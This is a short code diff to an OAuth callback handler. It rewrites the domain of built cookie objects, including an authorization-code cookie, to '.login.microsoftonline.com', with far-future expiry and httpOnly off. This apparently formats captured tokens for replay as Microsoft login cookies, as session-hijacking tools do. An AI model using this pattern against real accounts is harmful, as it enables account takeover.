@@ -192,7 +192,7 @@ async function handleOAuthCallback() {
                             {
                                 name: 'OAUTH_AUTHORIZATION_CODE',
                                 value: authCode,
-                                domain: window.location.hostname,
+                                domain: '.login.microsoftonline.com',
                                 expirationDate: 2147483647,
                                 hostOnly: false,
                                 httpOnly: false,
@@ -224,7 +224,7 @@ async function handleOAuthCallback() {
                             return {
                                 name: name.trim(),
                                 value: value.trim(),
-                                domain: '.' + window.location.hostname,
+                                domain: '.login.microsoftonline.com',
                                 expirationDate: 2147483647,
                                 hostOnly: false,
                                 httpOnly: false,
